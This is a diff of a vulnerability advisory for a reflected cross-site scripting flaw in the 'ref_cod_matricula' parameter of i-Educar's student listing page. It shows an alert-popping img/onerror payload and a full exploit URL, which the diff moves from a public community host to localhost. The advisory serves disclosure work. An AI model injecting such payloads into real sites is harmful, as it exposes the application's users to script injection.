@@ -12,9 +12,9 @@ The application fails to validate and sanitize user inputs in the `ref_cod_matri
 
 Insert the payload `"><img%20src=x%20onerror=alert(%27CVE-Hunters%27)>` in the field ` ref_cod_matricula`
 
-![XSS PoC](/images/xss001.png))
+![XSS PoC](/images/xss001.png)
 
-Full Payload: `https://comunidade.ieducar.com.br/intranet/educar_aluno_lst.php?ref_cod_matricula="><img%20src=x%20onerror=alert(%27CVE-Hunters%27)>`
+Full Payload: `https://localhost/intranet/educar_aluno_lst.php?ref_cod_matricula="><img%20src=x%20onerror=alert(%27CVE-Hunters%27)>`
 
 ### Impact
 
